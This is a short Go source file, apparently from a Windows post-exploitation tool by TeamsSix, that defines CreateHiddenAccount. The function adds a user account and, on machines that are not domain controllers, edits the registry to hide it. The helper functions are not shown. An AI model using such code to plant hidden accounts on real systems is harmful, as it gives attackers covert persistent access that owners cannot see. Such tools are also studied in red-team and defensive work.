// Author : TeamsSix
// Blog : teamssix.com
// WeChat Official Accounts: TeamsSix

package core

import (
	"../common"
)

func CreateHiddenAccount(username, password string) {
	if common.DetermineDC() {
		UserAdd(username, password)
	} else {
		UserAdd(username, password)
		EditRegistry(username)
	}
}
